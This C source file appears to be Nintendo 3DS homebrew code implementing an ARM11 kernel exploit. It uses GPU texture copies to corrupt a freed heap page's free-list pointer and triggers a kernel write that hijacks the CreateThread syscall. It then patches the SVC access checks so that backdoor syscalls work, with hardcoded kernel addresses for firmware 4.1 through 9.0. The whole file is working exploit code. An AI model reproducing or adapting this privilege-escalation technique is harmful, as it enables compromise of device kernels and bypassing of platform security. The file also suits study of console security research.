#include <3ds.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <malloc.h>
#include <dirent.h>

#include "utils.h"

u32 patch_addr;
u32 svc_patch_addr;

bool patched_svc = false;

u32 *backup;
u32 *arm11_buffer;

u32 nop_slide[0x1000] __attribute__((aligned(0x1000)));

// Uncomment to have progress printed w/ printf
#define DEBUG_PROCESS

#define dbg_log(...) printf(__VA_ARGS__)
#ifdef DEBUG_PROCESS
#else
#define dbg_log(...)
#endif

int do_gshax_copy(void *dst, void *src, unsigned int len)
{
	unsigned int check_mem = linearMemAlign(0x10000, 0x40);
	int i = 0;

	// Sometimes I don't know the actual value to check (when copying from unknown memory)
	// so instead of using check_mem/check_off, just loop "enough" times.
	for (i = 0; i < 5; ++i) {
		GSPGPU_FlushDataCache (NULL, src, len);
		GX_SetTextureCopy(NULL, src, 0, dst, 0, len, 8);
		GSPGPU_FlushDataCache (NULL, check_mem, 16);
		GX_SetTextureCopy(NULL, src, 0, check_mem, 0, 0x40, 8);
	}

	linearFree(check_mem);

	return 0;
}

void dump_bytes(void *dst) {
	printf("DUMPING %p\n", dst);
	do_gshax_copy(arm11_buffer, dst, 0x20u);

	printf(" 0: %08X  4: %08X  8: %08X\n12: %08X 16: %08X 20: %08X\n",
			arm11_buffer[0], arm11_buffer[1], arm11_buffer[2],
			arm11_buffer[3], arm11_buffer[4], arm11_buffer[5]);
}

int get_version_specific_addresses()
{
	// get proper patch address for our kernel -- thanks yifanlu once again
	u32 kversion = *(vu32*)0x1FF80000; // KERNEL_VERSION register

	patch_addr = 0;
	svc_patch_addr = 0;

	u8 isN3DS = 0;
	APT_CheckNew3DS(NULL, &isN3DS);

	if(!isN3DS || kversion < 0x022C0600)
	{
		switch (kversion)
		{
			case 0x02220000: // 2.34-0 4.1.0
				patch_addr = 0xEFF83C97;
				svc_patch_addr = 0xEFF827CC;
				break;
			case 0x02230600: // 2.35-6 5.0.0
				patch_addr = 0xEFF8372F;
				svc_patch_addr = 0xEFF822A8;
				break;
			case 0x02240000: // 2.36-0 5.1.0
			case 0x02250000: // 2.37-0 6.0.0
			case 0x02260000: // 2.38-0 6.1.0
				patch_addr = 0xEFF8372B;
				svc_patch_addr = 0xEFF822A4;
				break;
			case 0x02270400: // 2.39-4 7.0.0
				patch_addr = 0xEFF8372F;
				svc_patch_addr = 0xEFF822A8;
				break;
			case 0x02280000: // 2.40-0 7.2.0
				patch_addr = 0xEFF8372B;
				svc_patch_addr = 0xEFF822A4;
				break;
			case 0x022C0600: // 2.44-6 8.0.0
				patch_addr = 0xDFF83767;
				svc_patch_addr = 0xDFF82294;
				break;
			case 0x022E0000: // 2.26-0 9.0.0
				patch_addr = 0xDFF83837;
				svc_patch_addr = 0xDFF82290;
				break;
			default:
				dbg_log("Unrecognized kernel version 0x%08X, returning...\n", kversion);
				return 0;
		}
	}
	else
	{
		switch (kversion)
		{
			case 0x022C0600: // N3DS 2.44-6 8.0.0
			case 0x022E0000: // N3DS 2.26-0 9.0.0
				patch_addr = 0xDFF8382F;
				svc_patch_addr = 0xDFF82260;
				break;
			default:
				dbg_log("Unrecognized kernel version 0x%08X, returning...\n", kversion);
				return 0;
		}
	}

	dbg_log("Kernel Version:    0x%08X\n", kversion);
	dbg_log("CreateThread Addr: 0x%08X\n", patch_addr);
	dbg_log("SVC Addr:          0x%08X\n", svc_patch_addr);
	return 1;
}

int arm11_kernel_exploit_setup(void)
{
	unsigned int *test;
	int i;
	int (*nop_func)(void);
	int *ipc_buf;
	int model;

	get_version_specific_addresses();

	// part 1: corrupt kernel memory
	u32 tmp_addr;

	unsigned int mem_hax_mem;
	svcControlMemory(&mem_hax_mem, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, 0x3);
	unsigned int mem_hax_mem_free = mem_hax_mem + 0x1000;

	printf("Freeing memory\n");
	svcControlMemory(&tmp_addr, mem_hax_mem_free, 0, 0x1000, MEMOP_FREE, 0); // free page 

	printf("Backing up heap area\n");
	do_gshax_copy(arm11_buffer, mem_hax_mem_free, 0x20u);

	u32 saved_heap[8];
	memcpy(saved_heap, arm11_buffer, sizeof(saved_heap));

	arm11_buffer[0] = 1;
	arm11_buffer[1] = patch_addr;
	arm11_buffer[2] = 0;
	arm11_buffer[3] = 0;

	// Overwrite free pointer
	dbg_log("Overwriting free pointer 0x%08X\n", mem_hax_mem);

	//Trigger write to kernel
	do_gshax_copy(mem_hax_mem_free, arm11_buffer, 0x10u);
	svcControlMemory(&tmp_addr, mem_hax_mem, 0, 0x1000, MEMOP_FREE, 0);

#ifdef DEBUG_PROCESS
	printf("Triggered kernel write\n");
	gfxFlushBuffers();
	gfxSwapBuffers();
#endif

	memcpy(arm11_buffer, saved_heap, sizeof(saved_heap));
	printf("Restoring heap\n");
	do_gshax_copy(mem_hax_mem, arm11_buffer, 0x20u);

	 // part 2: trick to clear icache
	for (i = 0; i < 0x1000; i++)
	{
		arm11_buffer[i] = 0xE1A00000; // ARM NOP instruction
	}
	arm11_buffer[i-1] = 0xE12FFF1E; // ARM BX LR instruction
	nop_func = nop_slide;

	do_gshax_copy(nop_slide, arm11_buffer, 0x10000);

	HB_FlushInvalidateCache();
	nop_func();

#ifdef DEBUG_PROCESS
	printf("Exited nop slide\n");
	gfxFlushBuffers();
	gfxSwapBuffers();
#endif

	get_version_specific_addresses();

	return 1;
}

// after running setup, run this to execute func in ARM11 kernel mode
int __attribute__((naked))
arm11_kernel_exploit_exec (int (*func)(void))
{
	asm volatile ("svc 8 \t\n" // CreateThread syscall, corrupted, args not needed
				  "bx lr \t\n");
}


void test(void)
{
	arm11_buffer[0] = 0xFAAFFAAF;
}

int __attribute__((naked))
arm11_patch_kernel(void)
{
	asm volatile ("add sp, sp, #8 \t\n");

	arm11_buffer[0] = 0xF00FF00F;

	// fix up memory
	*(vu32*)(patch_addr + 8) = 0x8DD00CE5;

	// give us access to all SVCs (including 0x7B, so we can return to kernel mode)
	if (svc_patch_addr > 0)
	{
		*(vu32*)(svc_patch_addr) = 0xE320F000; // NOP
		*(vu32*)(svc_patch_addr + 8) = 0xE320F000; // NOP
		patched_svc = true;
	}

	InvalidateEntireInstructionCache();
	InvalidateEntireDataCache();

	asm volatile ("movs r0, #0      \t\n"
				  "ldr pc, [sp], #4 \t\n");
}

int doARM11Hax()
{
	int result = 0;
	int i;
	int (*nop_func)(void);
	HB_ReprotectMemory(nop_slide, 4, 7, &result);

	for (i = 0; i < 0x1000; i++)
	{
		nop_slide[i] = 0xE1A00000; // ARM NOP instruction
	}
	nop_slide[i-1] = 0xE12FFF1E; // ARM BX LR instruction
	nop_func = nop_slide;
	HB_FlushInvalidateCache();

	dbg_log("Testing nop slide\n");

	nop_func();

#ifdef DEBUG_PROCESS
	printf("Exited nop slide\n");
#endif

	unsigned int addr;
	void *this = 0x08F10000;
	int *written = 0x08F01000;
	arm11_buffer = linearMemAlign(0x10000, 0x10000);

	// wipe memory for debugging purposes
	for (i = 0; i < 0x1000/4; i++)
	{
		arm11_buffer[i] = 0xdeadbeef;
	}

	if (arm11_kernel_exploit_setup())
	{
		dbg_log("Kernel exploit set up\n");

		arm11_kernel_exploit_exec(arm11_patch_kernel);
		dbg_log("ARM11 Kernel code executed\n");

		if (patched_svc)
		{
			dbg_log("Testing SVC 0x7B\n");
			svcBackdoor(test);
		}
	}
#ifdef DEBUG_PROCESS
	else
	{
		printf("Kernel exploit set up failed!\n");
	}
#endif

	return 0;
}
